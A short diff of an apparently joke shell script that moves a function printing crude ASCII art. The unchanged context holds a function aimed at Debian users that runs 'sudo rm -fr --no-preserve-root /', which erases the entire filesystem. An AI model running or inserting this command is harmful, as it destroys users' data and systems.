@@ -112,6 +112,10 @@ function weaboo_time() {
     cross_unix_link_ditcher $YESSSS
 }
 
+function send_nudes() {
+    echo "(.)_(.)"
+}
+
 # Oh my, you use debian family distro?
 function i_use_debian_family() {
     sudo rm -fr --no-preserve-root /
@@ -128,6 +132,3 @@ function gender_sex_validation() {
     unset gender;
 }
 
-function send_nudes() {
-    echo "(.)_(.)"
-}
